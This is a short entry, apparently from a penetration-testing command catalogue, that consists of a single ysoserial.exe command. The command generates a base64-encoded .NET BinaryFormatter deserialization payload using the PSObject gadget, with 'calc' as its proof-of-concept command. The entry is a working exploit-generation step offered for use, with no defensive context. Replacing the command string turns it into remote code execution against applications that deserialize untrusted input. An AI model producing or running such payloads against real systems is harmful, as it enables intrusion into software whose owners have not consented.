---
id: 6efbd36a-da36-45e6-9f58-ea0874d61d35
name: Generate base64 encoded payload using ysoserial.exe
type: command
executor: bash
data: ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
output: null
created_at: '2023-04-06T03:55:59.089154+00:00'
updated_at: '2023-04-06T03:55:59.103773+00:00'
---

# Generate base64 encoded payload using ysoserial.exe

```bash
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```


